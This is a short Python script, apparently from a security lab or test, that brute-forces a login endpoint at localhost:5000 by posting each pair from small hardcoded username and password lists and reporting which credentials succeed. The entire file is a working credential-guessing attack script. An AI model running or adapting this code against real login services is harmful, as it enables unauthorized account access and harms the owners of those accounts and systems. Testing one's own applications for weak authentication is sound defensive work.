import requests

# URL for the vulnerable login endpoint
url = "http://localhost:5000/login"

# Sample lists of usernames and passwords (you can extend these lists)
usernames = ["admin", "user"]
passwords = ["admin123", "password", "wrongpass", "123456"]

print("Starting brute-force test on /login ...")

for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(url, json=data)
        if response.status_code == 200:
            print(f"[SUCCESS] Valid credentials found: {username}:{password}")
        else:
            print(f"[FAILURE] {username}:{password} returned status {response}")
